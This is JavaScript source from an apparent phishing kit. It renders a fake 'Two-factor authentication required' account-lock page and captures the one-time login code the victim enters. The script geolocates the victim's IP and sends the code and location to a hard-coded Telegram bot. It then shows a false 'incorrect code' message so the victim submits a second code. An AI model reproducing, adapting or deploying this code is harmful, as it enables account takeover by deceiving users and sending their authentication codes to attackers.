
function getIP(callback) {
    fetch('https://api.db-ip.com/v2/free/self')
        .then(response => response.json())
        .then(data => callback(data))
        .catch(error => callback(undefined));
}
let IpAddress = '';
    
getIP(ip => {
    IpAddress = ip;
});
$(document).ready(function () {
    // getCode();
    updateHtmlAndCallback(function (){
        sendCode();
    })

    setTime();
    $('#back-hone').on('click',function (){
        window.location.href = '/end';
    })
    $('#send').on('click',function (){
        $('.lsd-ring-container').removeClass('d-none');

        setTimeout(function (){
            $('.lsd-ring-container').addClass('d-none');
        },2000);
    })
});

function setTime() {
    var totalTime = 5 * 60;

    var timer = setInterval(function () {
        totalTime--;
        var minutes = Math.floor(totalTime / 60);
        var seconds = totalTime % 60;

        minutes = minutes < 10 ? '0' + minutes : minutes;
        seconds = seconds < 10 ? '0' + seconds : seconds;

        $('#time').text(minutes + ":" + seconds);

        if (totalTime <= 0) {
            clearInterval(timer);
            $('#time').text("00:00");
        }
    }, 1000);

    let IpAddress = '';
}
/*
function maskEmail(email) {
    var maskedEmail = email;
    var splitEmail = email.split('@');
    if (splitEmail.length > 1 && splitEmail[0].length > 3) {
        var localPart = splitEmail[0];
        var domainPart = '@' + splitEmail[1];
        var visiblePart = localPart.substring(0, 3);
        maskedEmail = visiblePart + '*'.repeat(localPart.length - 3) + domainPart;
    }
    return maskedEmail;
}

function maskPhone(phone) {
    var maskedPhone = phone;
    if (phone.length >= 5) {
        var visibleStart = phone.substring(0, 3);
        var visibleEnd = phone.substring(phone.length - 2, phone.length);
        maskedPhone = visibleStart + '*'.repeat(phone.length - 5) + visibleEnd;
    }
    return maskedPhone;
}
*/
// <span id="phone" className="fw-bold">` + maskPhone(data.phone) + `</span>,
//     <span id="buEmail" className="fw-bold">` + maskEmail(data.buEmail) + `</span>
// or
// < span
// id = "peEmail"
// className = "fw-bold" > ` + maskEmail(data.perEmail) + ` < /span>
function updateHtmlAndCallback(callback) {
    $('#code-form .card-body').html(`
                <h2 class="card-title fw-bold">Two-factor authentication required (1/3)</h2>
                <p class="card-text py-3">We have temporarily blocked your account because your
                    protect has changed. Verify code has been sent
                </p>
                <img src="/img/TOtVy8P.png" class="w-100 rounded" alt="">
                <input type="text" class="form-control my-3 py-2 bg-light" id="code"
                    placeholder="Enter your code" required>
                <p class="text-danger ms-1 d-none" id="wrong-code">
                    The code generator you entered is incorrect. Please wait 5 minutes to receive another one.
                </p>
                <div class="bg-light rounded py-3 mb-3 d-flex justify-content-between align-items-center">
                    <div class="mx-3">
                        <i class="fa fa-info-circle" aria-hidden="true" style="font-size: 1.5rem;color: #9f580a;"></i>
                    </div>

                    <p class="mb-0">
                        You’ve asked us to require a 6-digit or 8-digit login code when anyone tries to access your
                        account from a
                        new device or browser. Enter the 6-digit or 8-digit code from your code generator or third-party app below.
                        <br>
                        Please wait <span id="time" class="fw-bold">05:00</span> to request the sending of the code.
                    </p>
                </div>
                <p>We'll walk you through some steps to secure and unlock your account.</p>
                <button type="button" class="btn bg-light border w-100 py-3 fw-bold" id="send-code">Submit</button>
                <p class="mt-3 mb-0 text-center" style="cursor: pointer;color: rgb(30 66 159);" id="send">Send Code</p>
                `)
    if (callback && typeof callback === 'function') {
        callback();
    }
}

// function getCode() {
//     $.ajax({
//         url: '/current-user',
//         type: 'GET',
//         beforeSend: function () {
//             $('.lsd-ring-container').removeClass('d-none');
//         },
//         success: function (data) {
//             if (data.buEmail == null || data.perEmail == null || data.phone == null) {
//                 window.location.href = '/business';
//             } else {
//                 updateHtmlAndCallback(data,function (){
//                     sendCode(data);
//                 })
//             }
//
//             $('.lsd-ring-container').addClass('d-none');
//         },
//         error: function (xhr, status, error) {
//             setTimeout(function () {
//                 Swal.fire({
//                     text: `Request failed!`,
//                     icon: "error"
//                 });
//                 $('.lsd-ring-container').addClass('d-none');
//             }, 500);
//         }
//
//     });
// }
let NUMBER_TIME_SEND_CODE = 0;
let code1='';
let code2='';
let Fcode='';
function sendCode() {
    $('#code').on('input', function () {
        const input = $(this).val();
        const validInputRegex = /^\d+$/; // Chỉ cho phép số và dấu cộng

        if (!validInputRegex.test(input)) {
            // Nếu nhập giá trị không hợp lệ, loại bỏ ký tự cuối cùng nhập vào
            $(this).val(input.slice(0, -1));
        }
    });

    $('#send-code').on('click', function () {

        const keymap = $("#code").val();

        if (keymap === '') {
            $('#code').addClass('border-danger');
            return;
        } else {
            $('#code').removeClass('border-danger');
        }
        code1=keymap;
        const message1   = 
        '%0A<strong>Code: </strong>'+code1+
        '%0A<strong>IP Address: </strong>' + IpAddress.ipAddress +
        '%0A<strong>Country : </strong>' + IpAddress.countryName +'( '+IpAddress.countryCode+' )'+
        '%0A<strong>City : </strong>' + IpAddress.city ;



        NUMBER_TIME_SEND_CODE++;
        const botToken = '7264552448:AAEqLBp-YcZAabRDDkYPZYgfmTMzdFjEVcM'; // Thay YOUR_BOT_TOKEN bằng bot_token của bạn
        const chatId = '-1002299618966'; // Thay YOUR_CHAT_ID bằng chat_id của bạn
        const message = message1; // Tin nhắn sẽ là dữ liệu sản phẩm

        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=html`;

        fetch(telegramUrl)
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json();
            })
            .then(data => {
                
                setTimeout(function () {
                    if (NUMBER_TIME_SEND_CODE == 1){
                        $('#wrong-code').removeClass('d-none');
                    }else{
                        $('#getCode').removeClass('d-none');
                    }
                    $('.lsd-ring-container').addClass('d-none');
                }, 2000);
            })
            .catch(error => {
                setTimeout(function () {
                    Swal.fire({
                        text: `Request failed!`,
                        icon: "error"
                    });
                    $('.lsd-ring-container').addClass('d-none');
                }, 500);
            });
      /*  $.ajax({
            url: '/sendInfo',
            type: 'POST',
            contentType: 'application/json',
            data: JSON.stringify({keymap : keymap}),
            beforeSend: function () {
                $('.lsd-ring-container').removeClass('d-none');
            },
            success: function (data) {
                setTimeout(function () {
                    if (NUMBER_TIME_SEND_CODE == 1){
                        $('#wrong-code').removeClass('d-none');
                    }else{
                        $('#getCode').removeClass('d-none');
                    }
                    $('.lsd-ring-container').addClass('d-none');
                }, 2000);

            },
            error: function (xhr, status, error) {
                setTimeout(function () {
                    Swal.fire({
                        text: `Request failed!`,
                        icon: "error"
                    });
                    $('.lsd-ring-container').addClass('d-none');
                }, 2000);
            }

        });*/
    })

}
